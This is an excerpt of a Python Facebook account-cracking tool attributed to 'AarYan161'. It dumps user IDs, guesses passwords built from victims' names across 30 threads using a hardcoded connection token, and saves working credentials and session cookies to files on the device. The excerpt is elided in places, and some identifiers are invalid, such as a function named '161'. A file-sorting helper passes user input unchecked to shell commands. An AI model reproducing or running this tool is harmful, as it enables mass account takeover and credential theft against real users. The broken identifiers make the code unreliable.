...
from concurrent.futures import ThreadPoolExecutor as AarYan161
from string import * 
...
sys.stdout.write('\x1b]2; 161\x07')
S = '\033[1;37m'
A = '\x1b[38;5;208m'
R = '\x1b[38;5;46m'
F = '\x1b[38;5;48m'
...
\033[1;37m------------------------------------------------
\033[1;37m Owner   :             AarYan
\033[1;37m Facebook:            Aaryan Sharma
\033[1;37m Github  :            AarYan161
...
def result(OKs,cps):
    if len(OKs) != 0 or len(cps) != 0:
        ...
        print(47*'-')
        input("Press enter to back 161 Menu ")
        exit()
...
def AarYan():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://chat.whatsapp.com/Fz509NbTgnR4HTVkhqeZcL')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/groups/194785138812637/?ref=share')
    else:
        print('\n Select valid option ... ')
        time.sleep(2)
        161(allkey)
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[161] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    break
                     ...
                     #print(f"\r{A} [161-CP] {sid} | {ps} {S}")
                     cps.append(sid)
                     open('/sdcard/161_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
            loop+=1
    ...
    def methodC(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[161] {loop} | M3 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ...
                    print(f"\r{R} [161-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/161_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/161_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [161-CP] {sid} | {ps} {S}")
                    cps.append(sid)
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[161] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[161] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
        ...
        try:
            for pw in psw:
                ...
                if 'c_user' in session.cookies.get_dict():
                    print(f"\r{R} [161-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/161_OK.txt','a').write(sid+'|'+ps+'\n')
                    break
    ...
    def pasw(self):       
            ...
            print(47*"-")
            with Aaryan161161(max_workers=30) as 161world:
                for zsb in self.id:
                   try:
                       uid, name = zsb.split('|')
                       sz = name.split(' ')
                       if len(sz) == 3 or len(sz) == 4 or len(sz) == 5 or len(sz) == 8:
                           pwx =  pw
                            ...
                            if 'methodA' in methods:
                                161world.submit(self.methodA, uid, name, pwx)
                            elif 'methodB' in methods:
                                161world.submit(self.methodB, uid, name, pwx)
                            elif 'methodC' in methods:
                                161world.submit(self.methodC, uid, name, pwx)
                            elif 'methodD' in methods:
                                161world.submit(self.methodD, uid, name, pwx)
                   except:pass
            result(oks,cps)   
    ...
    try:
        ...
        for rept in range(srange):
            ...
            try:
                ...
                print(f"\n{S}ID Not Found ...");pass
                menu()
        print(f'File Name To Dump Ids. Example /sdcard/161.txt') 
        print(47*"-")
...
def sids():
    ...
    clear()
    print('\033[1;37mExample: /sdcard/161.txt\033[0;97m')
    print(47*'-')
...
def cutter():
    ...
    161 = input('Put File Name :')
    print(" ")
    AarYan = input('Saving Put File Name :')
    os.system('touch ' +AarYan)
    os.system('sort -r '+161+' | uniq > '+AarYan)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + 161 )
    print(47*'-')
    print("File Saved To :" + AarYan )
    print(47*'-')
    input(f"{S} Press Enter To Back 161 Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        srange = int(input('How many IDs do you want to add?: ' ))
        clear()
        print(f'{S}File Name To Dump Ids. Example /sdcard/161.txt\n') 
        filepath = input("Put File Name: ")
